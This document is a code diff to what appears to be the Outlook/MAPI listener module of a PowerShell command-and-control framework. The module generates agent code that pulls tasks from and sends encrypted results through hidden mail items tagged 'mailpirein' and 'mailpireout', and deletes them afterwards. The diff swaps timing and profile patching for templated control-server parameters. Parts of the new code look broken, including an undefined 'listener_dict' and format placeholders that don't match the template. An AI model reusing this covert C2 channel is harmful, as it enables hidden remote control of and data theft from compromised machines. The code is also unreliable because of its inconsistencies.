@@ -384,13 +384,6 @@ class Listener:
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
 
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
-
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
@@ -400,12 +393,15 @@ class Listener:
             print helpers.color("[!] listeners/http_mapi generate_agent(): invalid language specification, only 'powershell' is currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None,**kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
+
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
 
         if language:
             if language.lower() == 'powershell':
@@ -416,14 +412,18 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {
-                        try {
+                    $script:GetTask = {{
+                        try {{
+                                param($FixedParameters)
+                                $ControlServers = {ControlServers};
+                                $ServerIndex = 0;
+
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random;
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
 
                                 $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
                                 $mail.Subject = "mailpireout";
@@ -435,35 +435,36 @@ class Listener:
                                 $break = $False;
                                 [byte[]]$b = @();
 
-                                While ($break -ne $True){
-                                  foreach ($item in $fld.Items) {
-                                    if($item.Subject -eq "mailpirein"){
+                                While ($break -ne $True){{
+                                  foreach ($item in $fld.Items) {{
+                                    if($item.Subject -eq "mailpirein"){{
                                       $item.HTMLBody | out-null;
-                                      if($item.Body[$item.Body.Length-1] -ne '-'){
+                                      if($item.Body[$item.Body.Length-1] -ne '-'){{
                                         $traw = $item.Body;
                                         $item.Delete();
                                         $break = $True;
                                         $b = [System.Convert]::FromBase64String($traw);
-                                      }
-                                    }
-                                  }
+                                      }}
+                                    }}
+                                  }}
                                   Start-Sleep -s 1;
-                                }
+                                }}
                                 return ,$b
+                        }}
+                        catch {{
 
-                        }
-                        catch {
-
-                        }
-                        while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};}
-                    }
+                        }}
+                        while(($fldel.Items | measure | %{{$_.Count}}) -gt 0 ){{ $fldel.Items | %{{$_.delete()}};}}
+                    }}
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
-                        param($Packets)
+                    $script:SendMessage = {{
+                        param($Packets,$FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
 
-                        if($Packets) {
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets;
                             # build the top level RC4 "routing packet"
@@ -472,7 +473,7 @@ class Listener:
 
                             # $RoutingPacketp = [System.BitConverter]::ToString($RoutingPacket);
                             $RoutingPacketp = [Convert]::ToBase64String($RoutingPacket)
-                            try {
+                            try {{
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random;
                                     $mail = $"""+helpers.generate_random_script_var_name("GPF")+""".CreateItem(0);
@@ -480,14 +481,23 @@ class Listener:
                                     $mail.Body = "POSTM - "+$taskURI +" - "+$RoutingPacketp;
                                     $mail.save() | out-null;
                                     $mail.Move($fld) | out-null;
-                                }
-                                catch {
-                                }
-                                while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};}
-                        }
-                    }
+                                }}
+                                catch {{
+                                }}
+                                while(($fldel.Items | measure | %{{$_.Count}}) -gt 0 ){{ $fldel.Items | %{{$_.delete()}};}}
+                        }}
+                    }}
                 """
-                return updateServers + getTask + sendMessage
+                if deployed:
+                    return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                            getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+                else:
+                    return (listener_dict,
+                            getTask.format(ControlServers = updateServers,
+                                           name = listenerOptions['Name']['Value'],
+                                           reqheader = listenerOptions['RequestHeader']['Value']),
+                            sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             else:
                 print helpers.color("[!] listeners/http_mapi generate_comms(): invalid language specification, only 'powershell' is currently supported for this module.")
